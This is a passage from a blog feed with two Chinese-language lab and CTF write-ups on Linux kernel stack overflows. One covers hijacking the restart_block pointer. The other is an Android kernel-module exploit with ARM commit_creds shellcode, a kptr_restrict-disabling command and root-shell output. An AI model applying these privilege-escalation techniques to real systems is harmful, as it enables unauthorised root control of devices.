    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>说实话这个题目还是没有出来,但是我认为该题应该是vmlinux的一些问题,我试了比较久,一直不能让restart_block击中题目特别设置的0x9e3779b9,感觉应该是我编译的vmlinux没有开启cannay,一个函数的栈的大小和原题应该有出入之类导致的,(估计是我比较菜啦),但是这道题目的主要内容还是学到了的,这里给出我的分析.</p><h3 id="关于内核栈"><a href="#关于内核栈" class="headerlink" title="关于内核栈"></a>关于内核栈</h3><p>在Linux上，系统上的每个线程都在内核内存中分配了相应的内核堆栈。x86上的Linux内核堆栈大小为4096或8192字节，因为有些程序需要从用户态进入内核态,当发生转换的时候,栈也会随着从用户栈转移为内核栈,而内核栈的结构如下图所示:<br><img src="/img/kstack.png" alt="我是图片"><br>因为内核栈比较小,所以非常容易溢出,如下图所示:<br><img src="/img/kstack-smash.png" alt="我是图片"><br>tread_info的结构体如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span>  *<span class="title">task</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exec_domain</span>  *<span class="title">exec_domain</span>;</span></span><br><span class="line">    __u32                flags;</span><br><span class="line">    __u32                status;</span><br><span class="line">    __u32                cpu;</span><br><span class="line">    <span class="keyword">int</span>                  preempt_count;</span><br><span class="line">    <span class="keyword">mm_segment_t</span>         addr_limit;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">restart_block</span> <span class="title">restart_block</span>;</span></span><br><span class="line">    <span class="keyword">void</span> __user         *sysenter_return;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_X86_32</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>        previous_esp;</span><br><span class="line">    __u8                 supervisor_stack[<span class="number">0</span>];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span>                  uaccess_err;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>作用是啥,因为thread_info很大,里面保存了restart_block指针,如果我们能溢出restart_block指针的值的话就可以通过如下调用来直接转入我们的函数执行:<br>restart_block的结构体如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">restart_block</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> (*fn)(struct restart_block *);</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ...</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">/* For futex_wait and futex_wait_requeue_pi */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ...</span><br><span class="line">        &#125; futex;</span><br><span class="line">        <span class="comment">/* For nanosleep */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ...</span><br><span class="line">        &#125; nanosleep;</span><br><span class="line">        <span class="comment">/* For poll */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ...</span><br><span class="line">        &#125; poll;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>restart_syscall的定义如下,发现其实调用了restart_block的fn指针作为函数来执行.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE0(restart_syscall)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">restart_block</span> *<span class="title">restart</span> = &amp;<span class="title">current_thread_info</span>()-&gt;<span class="title">restart_block</span>;</span></span><br><span class="line">    <span class="keyword">return</span> restart-&gt;fn(restart);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>所以我们只需要调用syscall(SYS_restart_syscall);就能执行我们溢出的指针值了.</p><h3 id="关于gdb调试内核的一些操作"><a href="#关于gdb调试内核的一些操作" class="headerlink" title="关于gdb调试内核的一些操作"></a>关于gdb调试内核的一些操作</h3><h4 id="通过info-stack来查看堆栈"><a href="#通过info-stack来查看堆栈" class="headerlink" title="通过info stack来查看堆栈"></a>通过info stack来查看堆栈</h4><div class="article-img"><p><img src="/img/info_stack.png" alt="我是图片"></p></div><h4 id="通过如下操作查看当前内核栈中的thread-info结构体"><a href="#通过如下操作查看当前内核栈中的thread-info结构体" class="headerlink" title="通过如下操作查看当前内核栈中的thread_info结构体."></a>通过如下操作查看当前内核栈中的thread_info结构体.</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print  *((struct thread_info*)(((<span class="keyword">uint32_t</span>)$sp &amp; <span class="number">0xffffe000</span>)))</span><br></pre></td></tr></table></figure><div class="article-img"><p><img src="/img/thread_info.png" alt="我是图片"></p></div><h4 id="通过如下操作查看restart-block的结构体"><a href="#通过如下操作查看restart-block的结构体" class="headerlink" title="通过如下操作查看restart_block的结构体"></a>通过如下操作查看restart_block的结构体</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print  ((struct thread_info*)(((<span class="keyword">uint32_t</span>)$sp &amp; <span class="number">0xffffe000</span>)))-&gt;restart_block</span><br></pre></td></tr></table></figure><div class="article-img"><p><img src="/img/restart_block.png" alt="我是图片"></p></div><h4 id="关于mmap申请一块内存"><a href="#关于mmap申请一块内存" class="headerlink" title="关于mmap申请一块内存"></a>关于mmap申请一块内存</h4><p>mmap的原型如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *start, <span class="keyword">size_t</span> length, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags, <span class="keyword">int</span> fd, <span class="keyword">off_t</span> offset)</span></span>;</span><br></pre></td></tr></table></figure></p><p>mmap是一种内存映射文件的方法，即将一个文件或者其它对象映射到进程的地址空间，实现文件磁盘地址和进程虚拟地址空间中一段虚拟地址的一一对映关系。实现这样的映射关系后，进程就可以采用指针的方式读写操作这一段内存，而系统会自动回写脏页面到对应的文件磁盘上，即完成了对文件的操作而不必再调用read,write等系统调用函数。相反，内核空间对这段区域的修改也直接反映用户空间，从而可以实现不同进程间的文件共享。如下图所示：<br><img src="/img/mmap.png" alt="我是图片"><br>linux内核使用vm_area_struct结构来表示一个独立的虚拟内存区域，由于每个不同质的虚拟内存区域功能和内部机制都不同，因此一个进程使用多个vm_area_struct结构来分别表示不同类型的虚拟内存区域。各个vm_area_struct结构使用链表或者树形结构链接，方便进程快速访问，如下图所示：<br><img src="/img/vm_area_struct.png" alt="我是图片"><br>在题解中,使用了如下的代码进行内存的分配:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">setup_payload(<span class="keyword">unsigned</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">/* asm(mov $addr, %eax; jmp *%eax); is 7 bytes wide */</span></span><br><span class="line">        <span class="keyword">unsigned</span> size = <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">unsigned</span> round_addr = addr &amp; PAGE_MASK;</span><br><span class="line">        <span class="keyword">unsigned</span> diff       = addr - round_addr;</span><br><span class="line">        <span class="keyword">unsigned</span> len        = (size + diff + (PAGE_SIZE - <span class="number">1</span>)) &amp; PAGE_MASK;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> *buf = mmap((<span class="keyword">void</span> *)round_addr, len, PROT_READ|PROT_WRITE|PROT_EXEC,</span><br><span class="line">                        MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (buf == MAP_FAILED)</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">"mmap"</span>);</span><br><span class="line"></span><br><span class="line">        generate_shellcode(buf + diff);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[+] Payload set\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>因为使用mmap需要注意的一个关键点是，mmap映射区域大小必须是物理页大小(page_size)的整倍数（32位系统中通常是4k字节）。原因是，内存的最小粒度是页，而进程虚拟地址空间和内存的映射也是以页为单位。为了匹配内存的操作，mmap从磁盘到虚拟地址空间的映射也必须是页。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/huxiao-tee/p/4660352.html" target="_blank" rel="noopener">https://www.cnblogs.com/huxiao-tee/p/4660352.html</a><br><a href="http://jon.oberheide.org/blog/2010/11/29/exploiting-stack-overflows-in-the-linux-kernel/" target="_blank" rel="noopener">http://jon.oberheide.org/blog/2010/11/29/exploiting-stack-overflows-in-the-linux-kernel/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;说实话这个题目还是没有出来,但是我认为该题应该是vmlinux的一些问题,我试了比较久,一直不能让restart_block击中题目特别设置
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux Kernel Exploitation on Android-Stack Buffer overflow</title>
    <link href="https://foyjog.github.io/2018/06/27/Linux-Kernel-Exploitation-on-Android-Stack-Buffer-overflow/"/>
    <id>https://foyjog.github.io/2018/06/27/Linux-Kernel-Exploitation-on-Android-Stack-Buffer-overflow/</id>
    <published>2018-06-27T08:05:40.000Z</published>
    <updated>2018-07-03T08:18:18.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>昨天搭建好了环境,那么开始最简单的一个exploit.即:Stack Buffer overflow.<br>我这里下载的是r10版本的ndk-build进行编译.</p><h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>模块并没有开canary,所以canany的获取是无效的.<br>在进行调试之前记得要开kptr_restrict<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell  &quot;echo 0 &gt; /proc/sys/kernel/kptr_restrict&quot;</span><br></pre></td></tr></table></figure></p><p>这里面该exploit其实很好懂,一个简单的栈溢出,没有canary,通过覆盖驱动的返回地址就能实现提权,(当然这在新的安卓系统中是完全不可行的,SMAP,PAN等等机制阻拦当前安卓内核的提权)</p><p>这里稍微注释一下我遇到的问题所在:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// commit_creds(prepare_kernel_cred(0));</span></span><br><span class="line"><span class="comment">// -&gt; get root</span></span><br><span class="line"><span class="string">"LDR     R3, =0xc0039d34\n\t"</span><span class="comment">//prepare_kernel_cred</span></span><br><span class="line"><span class="string">"MOV     R0, ####0\n\t"</span></span><br><span class="line"><span class="string">"BLX     R3\n\t"</span></span><br><span class="line"><span class="string">"LDR     R3, =0xc0039834\n\t"</span><span class="comment">//commit_creds</span></span><br><span class="line"><span class="string">"BLX     R3\n\t"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Fix the trashed stack by restoring r4/r5 from duped values on the stack</span></span><br><span class="line"><span class="string">"ldr r0, =0xc00fa4a4\t\n"</span></span><br><span class="line"><span class="string">"ldr r4, [sp] \t\n"</span></span><br><span class="line"><span class="string">"ldr r5, [sp, ####4]\t\n"</span></span><br><span class="line"><span class="string">"bx r0\t\n"</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></p><p>这里面r3的地址要自己根据实际的情况具体赋值<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">found kernel symbols as follows:</span><br><span class="line">prepare_kernel_cred:<span class="number">0xc0039d34</span></span><br><span class="line">commit_creds:<span class="number">0xc0039834</span></span><br><span class="line">proc_file_write:<span class="number">0xc00fa3f8</span></span><br></pre></td></tr></table></figure></p><p>r1的值其实是proc_entry_write()的返回地址,这通过断点在r1的值其实是proc_entry_write的时通过bt查看即可.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bt</span><br><span class="line">####<span class="number">0</span>  proc_entry_write (file=<span class="number">0xedb6e380</span>, ubuf=<span class="number">0xbee24a74</span> <span class="string">'A'</span> &lt;repeats <span class="number">68</span> times&gt;, <span class="string">"\234\201"</span>, count=<span class="number">0x48</span>, data=<span class="number">0x0</span>)</span><br><span class="line">    at drivers/vulnerabilities/kernel_build/../challenges/stack_buffer_overflow/<span class="keyword">module</span>/stack_buffer_overflow.c:<span class="number">17</span></span><br><span class="line">####1  0xc00fa4a4 in proc_file_write (file=0xedb6e380, buffer=0xbee24a74 'A' &lt;repeats 68 times&gt;, "\234\201", count=0x48, ppos=&lt;optimized out&gt;) at fs/proc/generic.c:225</span><br><span class="line">####2  0xc00f5b54 in proc_reg_write (file=0xedb6e380, buf=0xbee24a74 'A' &lt;repeats 68 times&gt;, "\234\201", count=0x48, ppos=0xed9a5f88) at fs/proc/inode.c:218</span><br><span class="line">####3  0xc00aff70 in vfs_write (file=0xedb6e380, buf=0xbee24a74 'A' &lt;repeats 68 times&gt;, "\234\201", count=0x48, pos=0xed9a5f88) at fs/read_write.c:435</span><br><span class="line">####4  0xc00b0084 in sys_write (fd=&lt;optimized out&gt;, buf=&lt;optimized out&gt;, count=0x48) at fs/read_write.c:487</span><br><span class="line">####<span class="number">5</span>  <span class="number">0xc000d680</span> in ?? ()</span><br><span class="line">####<span class="number">6</span>  <span class="number">0xc000d680</span> in ?? ()</span><br><span class="line">Backtrace stopped: <span class="function">previous frame identical to <span class="keyword">this</span> <span class="title">frame</span> <span class="params">(corrupt <span class="built_in">stack</span>?)</span></span></span><br></pre></td></tr></table></figure><p>可以得出0xc00fa4a4 in proc_file_write()就是我们想要返回的地址,因为如果直接返回到用户模式要执行IRET指令,需要一系列的操作,所以这里就正常返回,让内核去做这件事情就可以了.</p><p>最后得到shell:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">!master ~/Documents/Andorid_Fuzz/kernel_exploit_challenges/challenges/stack_buffer_overflow/solution&gt; ./build_and_run.sh</span><br><span class="line">[armeabi] Compile thumb  : stack_buffer_overflow_exploit &lt;= stack_buffer_overflow_exploit.c</span><br><span class="line">[armeabi] Executable     : stack_buffer_overflow_exploit</span><br><span class="line">[armeabi] Install        : stack_buffer_overflow_exploit =&gt; libs/armeabi/stack_buffer_overflow_exploit</span><br><span class="line">./libs/armeabi/stack_buffer_overflow_exploit: <span class="number">1</span> file pushed. <span class="number">1.8</span> MB/s (<span class="number">64068</span> bytes in <span class="number">0.034</span>s)</span><br><span class="line">found kernel symbols as follows:</span><br><span class="line">prepare_kernel_cred:<span class="number">0xc0039d34</span></span><br><span class="line">commit_creds:<span class="number">0xc0039834</span></span><br><span class="line">proc_file_write0xc00fa3f8</span><br><span class="line">[+] found canary: <span class="number">00020002</span></span><br><span class="line">[+] enjoy the shell</span><br><span class="line">root@generic:/ ### ls</span><br><span class="line">ls</span><br><span class="line">acct</span><br><span class="line">config</span><br><span class="line">d</span><br><span class="line">data</span><br><span class="line"><span class="keyword">default</span>.prop</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">file_contexts</span><br><span class="line">fstab.goldfish</span><br><span class="line">fstab.ranchu</span><br><span class="line">init</span><br><span class="line">init.environ.rc</span><br><span class="line">init.goldfish.rc</span><br><span class="line">init.ranchu.rc</span><br><span class="line">init.rc</span><br><span class="line">init.trace.rc</span><br><span class="line">init.usb.rc</span><br><span class="line">mnt</span><br><span class="line">proc</span><br><span class="line">property_contexts</span><br><span class="line">root</span><br><span class="line">sbin</span><br><span class="line">sdcard</span><br><span class="line">seapp_contexts</span><br><span class="line">sepolicy</span><br><span class="line">storage</span><br><span class="line">sys</span><br><span class="line">system</span><br><span class="line">ueventd.goldfish.rc</span><br><span class="line">ueventd.ranchu.rc</span><br><span class="line">ueventd.rc</span><br><span class="line">vendor</span><br><span class="line">root@generic:/ ### ^C</span><br><span class="line"><span class="built_in">exit</span> <span class="number">130</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;昨天搭建好了环境,那么开始最简单的一个exploit.即:Stack Buffer overflow.&lt;br&gt;我这里下载的是r10版本的nd
      
    
    </summary>
    
    
  </entry>
  
</feed>
